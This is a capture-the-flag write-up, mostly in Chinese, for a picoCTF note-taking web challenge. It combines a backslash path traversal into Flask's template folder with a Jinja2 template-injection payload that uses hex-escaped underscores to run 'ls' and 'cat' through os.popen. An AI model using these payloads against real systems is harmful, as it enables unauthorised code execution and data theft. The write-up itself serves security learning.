# notepad 50
>This note-taking site seems a bit off.
notepad.mars.picoctf.net
Hint 1  
It's weird that I can't note ..\templates\errors\
Hint 2  
Jinja2 is a good templating engine and I believe it must be perfectly safe!
## ErrorAttempt 1
``` python
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
```
看到限制了content的长度和'_'，猜测是写文件shell  
url_fix(content[:128])取了前128个字符，但是特殊的字符(@ $ _ #)经过url_fix会变成三个字符的urlencodeing，得到的长度可以达到384个字符，超过了Linux的文件名最长256的限制。  
合理构造输入可以顶掉后边的-{token_urlsafe(8)}.html，如 **'a'\*250+"1.php"+"-{token_urlsafe(8)}.html"** 就会变成 **'a'\*250+"1.php"**  
但是结果是一直500，可能是这个框架并不会写入超过长度限制的文件，而是直接返回异常。

## Explore
Hint 1，传入
>..\templates\errors\  

发现并没有被过滤，404是因为我们在static目录下，寻找templates目录。  
通过首页正常的错误代码可以访问到error下的文件，且error页面会被render_template加载
```python
def index():
    return render_template("index.html", error=request.args.get("error"))
```
百度到Flask有SSTI的风险，也可以  
Hint 2，Google搜索
>render_template Jinja2 SSTI

在 [Server Side Template Injection with Jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) 找到了很多注入的原理和绕过的姿势  
## Exploitation
直接用上边链接的RCE代码
```
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}
```
传入
```
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}
```
返回
>..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapp.py flag-c8f5526c-4122-4578-96de-d7dd27193798.txt static templates

读flag
```
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt')['read']()}}
```
得到flag